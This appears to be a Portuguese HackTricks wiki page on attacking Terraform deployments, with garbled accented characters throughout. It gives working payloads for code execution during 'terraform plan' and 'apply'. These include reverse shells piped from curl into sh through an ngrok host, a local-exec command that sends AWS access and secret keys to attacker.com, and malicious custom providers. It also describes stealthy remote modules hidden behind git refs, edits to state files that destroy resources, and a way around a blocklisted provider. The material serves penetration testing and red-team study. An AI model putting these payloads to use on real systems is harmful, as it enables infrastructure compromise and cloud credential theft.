# Seguran√ßa do Terraform

<details>

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoie o HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Informa√ß√µes B√°sicas

[A partir da documenta√ß√£o:](https://developer.hashicorp.com/terraform/intro)

O HashiCorp Terraform √© uma ferramenta de **infraestrutura como c√≥digo** que permite definir recursos **em nuvem e locais** em arquivos de configura√ß√£o leg√≠veis por humanos que podem ser versionados, reutilizados e compartilhados. Voc√™ pode ent√£o usar um fluxo de trabalho consistente para provisionar e gerenciar toda a sua infraestrutura ao longo de seu ciclo de vida. O Terraform pode gerenciar componentes de baixo n√≠vel como computa√ß√£o, armazenamento e recursos de rede, bem como componentes de alto n√≠vel como entradas DNS e recursos de SaaS.

### Como o Terraform funciona?

O Terraform cria e gerencia recursos em plataformas de nuvem e outros servi√ßos por meio de suas interfaces de programa√ß√£o de aplicativos (APIs). Os provedores permitem que o Terraform trabalhe com praticamente qualquer plataforma ou servi√ßo com uma API acess√≠vel.

![](<../.gitbook/assets/image (177).png>)

A HashiCorp e a comunidade do Terraform j√° escreveram **mais de 1700 provedores** para gerenciar milhares de tipos diferentes de recursos e servi√ßos, e esse n√∫mero continua a crescer. Voc√™ pode encontrar todos os provedores publicamente dispon√≠veis no [Terraform Registry](https://registry.terraform.io/), incluindo Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog e muitos outros.

O fluxo de trabalho principal do Terraform consiste em tr√™s etapas:

* **Escrever:** Voc√™ define recursos, que podem estar em v√°rios provedores de nuvem e servi√ßos. Por exemplo, voc√™ pode criar uma configura√ß√£o para implantar um aplicativo em m√°quinas virtuais em uma rede Virtual Private Cloud (VPC) com grupos de seguran√ßa e um balanceador de carga.
* **Planejar:** O Terraform cria um plano de execu√ß√£o descrevendo a infraestrutura que ser√° criada, atualizada ou destru√≠da com base na infraestrutura existente e em sua configura√ß√£o.
* **Aplicar:** Ap√≥s aprova√ß√£o, o Terraform executa as opera√ß√µes propostas na ordem correta, respeitando quaisquer depend√™ncias de recursos. Por exemplo, se voc√™ atualizar as propriedades de uma VPC e alterar o n√∫mero de m√°quinas virtuais nessa VPC, o Terraform recriar√° a VPC antes de dimensionar as m√°quinas virtuais.

![](<../.gitbook/assets/image (215).png>)

## Laborat√≥rio do Terraform

Apenas instale o terraform em seu computador.

Aqui voc√™ tem um [guia](https://learn.hashicorp.com/tutorials/terraform/install-cli) e aqui voc√™ tem a [melhor maneira de baixar o terraform](https://www.terraform.io/downloads).

## RCE no Terraform

O Terraform **n√£o possui uma plataforma expondo uma p√°gina da web ou um servi√ßo de rede** que podemos enumerar, portanto, a √∫nica maneira de comprometer o terraform √© **ser capaz de adicionar/modificar arquivos de configura√ß√£o do terraform**.

No entanto, o terraform √© um **componente muito sens√≠vel** para comprometer porque ele ter√° **acesso privilegiado** a diferentes locais para funcionar corretamente.

A principal maneira para um atacante ser capaz de comprometer o sistema onde o terraform est√° sendo executado √© **comprometer o reposit√≥rio que armazena as configura√ß√µes do terraform**, porque em algum momento elas ser√£o **interpretadas**.

Na verdade, existem solu√ß√µes por a√≠ que **executam automaticamente o terraform plan/apply ap√≥s a cria√ß√£o de um PR**, como o **Atlantis**:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Se voc√™ for capaz de comprometer um arquivo terraform, existem diferentes maneiras de realizar RCE quando algu√©m executar `terraform plan` ou `terraform apply`.

### Terraform plan

O `terraform plan` √© o **comando mais usado** no terraform e desenvolvedores/solu√ß√µes que usam o terraform o chamam o tempo todo, ent√£o a **maneira mais f√°cil de obter RCE** √© garantir que voc√™ envenene um arquivo de configura√ß√£o do terraform que executar√° comandos arbitr√°rios em um `terraform plan`.

#### Usando um provedor externo

O Terraform oferece o provedor [`external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs), que fornece uma maneira de interface entre o Terraform e programas externos. Voc√™ pode usar o recurso de dados `external` para executar c√≥digo arbitr√°rio durante um `plan`.

Injetar em um arquivo de configura√ß√£o do terraform algo como o seguinte executar√° um shell reverso ao executar `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Utilizando um provedor personalizado

Um atacante poderia enviar um [provedor personalizado](https://learn.hashicorp.com/tutorials/terraform/provider-setup) para o [Terraform Registry](https://registry.terraform.io/) e ent√£o adicion√°-lo ao c√≥digo do Terraform em um ramo de funcionalidade ([exemplo daqui](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
O provedor √© baixado no `init` e executar√° o c√≥digo malicioso quando o `plan` for executado

Voc√™ pode encontrar um exemplo em [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Usando uma refer√™ncia externa

Ambas as op√ß√µes mencionadas s√£o √∫teis, mas n√£o muito furtivas (a segunda √© mais furtiva, mas mais complexa do que a primeira). Voc√™ pode realizar esse ataque de uma maneira ainda mais **furtiva**, seguindo estas sugest√µes:

* Em vez de adicionar o rev shell diretamente no arquivo terraform, voc√™ pode **carregar um recurso externo** que contenha o rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Pode encontrar o c√≥digo rev shell em [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* No recurso externo, use o recurso **ref** para ocultar o **c√≥digo rev shell do terraform em um branch** dentro do reposit√≥rio, algo como: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Aplicar Terraform

O Terraform apply ser√° executado para aplicar todas as altera√ß√µes, voc√™ tamb√©m pode abusar dele para obter RCE injetando **um arquivo Terraform malicioso com** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Voc√™ s√≥ precisa garantir que algum payload como os seguintes termine no arquivo `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Siga as **sugest√µes da t√©cnica anterior** para realizar esse ataque de uma maneira **mais furtiva usando refer√™ncias externas**.

## Despejo de Segredos

Voc√™ pode ter **valores secretos usados pelo terraform despejados** executando `terraform apply` adicionando ao arquivo terraform algo como:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Abusando dos Arquivos de Estado do Terraform

No caso de ter acesso de escrita aos arquivos de estado do terraform, mas n√£o poder alterar o c√≥digo do terraform, [**esta pesquisa**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) oferece algumas op√ß√µes interessantes para aproveitar o arquivo:

### Excluindo recursos <a href="#deleting-resources" id="deleting-resources"></a>

Existem 2 maneiras de destruir recursos:

1. **Inserir um recurso com um nome aleat√≥rio no arquivo de estado apontando para o recurso real a ser destru√≠do**

Como o terraform ver√° que o recurso n√£o deveria existir, ele o destruir√° (seguindo o ID do recurso real indicado). Exemplo da p√°gina anterior:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Modificar o recurso a ser exclu√≠do de forma que n√£o seja poss√≠vel atualiz√°-lo (assim ele ser√° exclu√≠do e recriado)**

Para uma inst√¢ncia EC2, modificar o tipo da inst√¢ncia √© suficiente para fazer o terraform exclu√≠-la e recri√°-la.

### RCE

Tamb√©m √© poss√≠vel [criar um provedor personalizado](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) e simplesmente substituir um dos provedores no arquivo de estado do terraform pelo malicioso ou adicionar um recurso vazio com o provedor malicioso. Exemplo da pesquisa original:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
## Substituir provedor na lista negra

No caso de encontrar uma situa√ß√£o em que `hashicorp/external` foi colocado na lista negra, voc√™ pode re-implementar o provedor `external` fazendo o seguinte. Observa√ß√£o: Usamos um fork do provedor externo publicado por https://registry.terraform.io/providers/nazarewk/external/latest. Voc√™ tamb√©m pode publicar seu pr√≥prio fork ou re-implementa√ß√£o.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Ent√£o voc√™ pode usar `external` como de costume.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Ferramentas de Auditoria

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec utiliza an√°lise est√°tica do seu c√≥digo terraform para identificar potenciais configura√ß√µes incorretas.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan √© um analisador de c√≥digo est√°tico para Infraestrutura como C√≥digo.

## Refer√™ncias

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

<details>

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
